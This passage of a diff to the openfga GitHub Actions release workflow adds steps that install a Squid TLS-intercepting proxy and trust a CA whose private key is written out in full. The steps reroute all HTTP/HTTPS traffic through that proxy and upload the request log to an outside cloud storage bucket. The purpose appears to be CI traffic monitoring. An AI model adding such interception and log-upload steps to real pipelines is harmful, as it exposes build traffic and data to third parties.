+        MDIyMjIxNTJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+
+        HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
+
+        AQUAA4ICDwAwggIKAoICAQCdLvQDIyCns8bhvQOqTPVeYwa6pK11+9UKqjGRldBi
+
+        mpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+lXgMF0GfgpXRy2BULUxAYg8w4aTlR
+
+        32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQXG9QNYzMR+pGXsa1NNDRgSAvlQPMz
+
+        Le9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1QkzxcZLqproEIqOlS4KsGXyo6BwhXH+H
+
+        I82RCIbaj2ub4y355onYuAoTpsb9KBxud0HejzQesYen8OmgbNo9+FfK5+Q5XvYb
+
+        7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkgpjo/nkhw2OyCji6DFXCvlJRCBoup
+
+        n9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6ssgX+FMDrzeiNArdmIHKCPC3QrSb6
+
+        jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jitqMJuHGwKPtHopVqxK8k7p0PKvuGq
+
+        JIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B0lu7LZ/Aoh3ckh71IrSKyZafXLpU
+
+        mpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHqDYkELFBZ650JrYYrQ4UouRAucp8K
+
+        9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+Z89sQ4FoTtBvz1+Lv+s4ej/lVxoT
+
+        JQIDAQABo1MwUTAdBgNVHQ4EFgQUrUQ1F+rM0kk5tI/PEZvONIAL9WcwHwYDVR0j
+
+        BBgwFoAUrUQ1F+rM0kk5tI/PEZvONIAL9WcwDwYDVR0TAQH/BAUwAwEB/zANBgkq
+
+        hkiG9w0BAQsFAAOCAgEAihN0oWVSwHDimXbh3Wp7L2qc39whQEPu+m2OIB50Dp0X
+
+        K1WL784TzXmbz1DuvGXWGIjn4PDL5NQ991S3nPjD5Fk9VjzU4IZ9XR8AmVZFCltX
+
+        zZm01L6FQLGvjpQZs9KCEeS05CUjAiArPMsYSKJDTUi2XCuTR+FGiBHtYrg8GClp
+
+        EQkTCTA9kFNI6ThlDAPgwj4VBJZX5p8KAFlHpwztfDnIgfwdQJBUW1D2hkxLWyvs
+
+        tZFLmYAHk5Lfixpt2+25HAp5kHMRfoJQLAsRQ/kmeNjoG5WQkIshXDURQZQlPnmP
+
+        yBueix5POd09hYHSL3kqdHoiX0P0oqeLakAMqFnKJapjpsv7teWQPnlTgalCIA/7
+
+        RwhUqsxOlRV5/26oXrlYtgMneXemikVT0hS98aw3T2icSWq6/i0L1v21ZCP5DSKI
+
+        GR6lb9RCSkJvkoTjZAm7IvxMyOZsYY2FL2mm00aY9Ufqeqozf7/q8JWwd6gaIfd7
+
+        KqOUgu0a/+sgOAu5f+dd20zAhtvAttyQIpy1gGcda9DjXpdCTv1slErC94VCcZrE
+
+        LQlR5nEjAAKK/fZ07pgBwJdMY/kWE9WRx32olhhveRS9nczKSyhutwmbuU1vkfcN
+
+        26RR8dfuMnnNzxzd2Ht30Ep8wONz/kfw/xWuUo/A8pND2I6s6bt8K5iphrv3xVI=
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout code
+      uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
+    - continue-on-error: true
+      env:
+        SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+      name: Run Snyk to check Docker image for vulnerabilities
+      uses: snyk/actions/docker@640e31719aac3e44867d239dc86c20c3e34c8e4f
+      with:
+        args: --file=Dockerfile
+        image: openfga/openfga
+    - continue-on-error: true
+      name: Post-process snyk.sarif output
+      run: 'sed -i ''s/"security-severity": "undefined"/"security-severity": "0"/g''
+        snyk.sarif
+
+        '
+    - continue-on-error: true
+      name: Upload result to GitHub Code Scanning
+      uses: github/codeql-action/upload-sarif@2d790406f505036ef40ecba973cc774a50395aac
+      with:
+        sarif_file: snyk.sarif
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/criteo-forks/openfga.$(date
+        +%s)
+    timeout-minutes: 60
   verification-with-cosign:
-    needs: [ goreleaser, image-provenance ]
-    runs-on: ubuntu-latest
+    needs:
+    - goreleaser
+    - image-provenance
     permissions: read-all
+    runs-on: ubuntu-latest
     steps:
-      - name: Login to Docker Hub
-        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
-        with:
-          username: ${{ secrets.DOCKERHUB_USERNAME }}
-          password: ${{ secrets.DOCKERHUB_TOKEN }}
+    - name: before
+      run: 'sudo apt update
 
-      - name: Install Cosign
-        uses: sigstore/cosign-installer@59acb6260d9c0ba8f4a2f9d9b48431a222b68e20 # v3.5.0
+        sudo apt install -y squid-openssl
 
-      - name: Verify image
-        env:
-          IMAGE: openfga/openfga
-          DIGEST: ${{ needs.goreleaser.outputs.digest }}
-        run: |
-          cosign verify-attestation \
-             --type slsaprovenance \
-             --certificate-oidc-issuer https://token.actions.githubusercontent.com \
-             --certificate-identity-regexp '^https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v[0-9]+.[0-9]+.[0-9]+$' \
-             $IMAGE@$DIGEST
+        sudo mkdir /squid
 
-  # homebrew bump happens automagically after a few hours, see https://github.com/Homebrew/homebrew-core/commits/master/Formula/o/openfga.rb
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Login to Docker Hub
+      uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567
+      with:
+        password: ${{ secrets.DOCKERHUB_TOKEN }}
+        username: ${{ secrets.DOCKERHUB_USERNAME }}
+    - continue-on-error: true
+      name: Install Cosign
+      uses: sigstore/cosign-installer@59acb6260d9c0ba8f4a2f9d9b48431a222b68e20
+    - continue-on-error: true
+      env:
+        DIGEST: ${{ needs.goreleaser.outputs.digest }}
+        IMAGE: openfga/openfga
+      name: Verify image
+      run: "cosign verify-attestation \\\n   --type slsaprovenance \\\n   --certificate-oidc-issuer\
+        \ https://token.actions.githubusercontent.com \\\n   --certificate-identity-regexp\
+        \ '^https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v[0-9]+.[0-9]+.[0-9]+$'\
+        \ \\\n   $IMAGE@$DIGEST\n"
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/criteo-forks/openfga.$(date
+        +%s)
+    timeout-minutes: 60
+  verification-with-slsa-verifier:
+    needs:
+    - goreleaser
+    - binary-provenance
+    permissions: read-all
+    runs-on: ubuntu-latest
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        MIIFazCCA1OgAwIBAgIUESF0O95jnInouKvlcRiLTkelzHowDQYJKoZIhvcNAQEL
+
+        BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+
+        GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDEwMDQyMjIxNTJaFw0zNDEw
+
+        MDIyMjIxNTJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+
+        HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
+
+        AQUAA4ICDwAwggIKAoICAQCdLvQDIyCns8bhvQOqTPVeYwa6pK11+9UKqjGRldBi
+
+        mpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+lXgMF0GfgpXRy2BULUxAYg8w4aTlR
+
+        32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQXG9QNYzMR+pGXsa1NNDRgSAvlQPMz
+
+        Le9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1QkzxcZLqproEIqOlS4KsGXyo6BwhXH+H
+
+        I82RCIbaj2ub4y355onYuAoTpsb9KBxud0HejzQesYen8OmgbNo9+FfK5+Q5XvYb
+
+        7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkgpjo/nkhw2OyCji6DFXCvlJRCBoup
+
+        n9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6ssgX+FMDrzeiNArdmIHKCPC3QrSb6
+
+        jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jitqMJuHGwKPtHopVqxK8k7p0PKvuGq
+
+        JIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B0lu7LZ/Aoh3ckh71IrSKyZafXLpU
+
+        mpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHqDYkELFBZ650JrYYrQ4UouRAucp8K
+
+        9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+Z89sQ4FoTtBvz1+Lv+s4ej/lVxoT
+
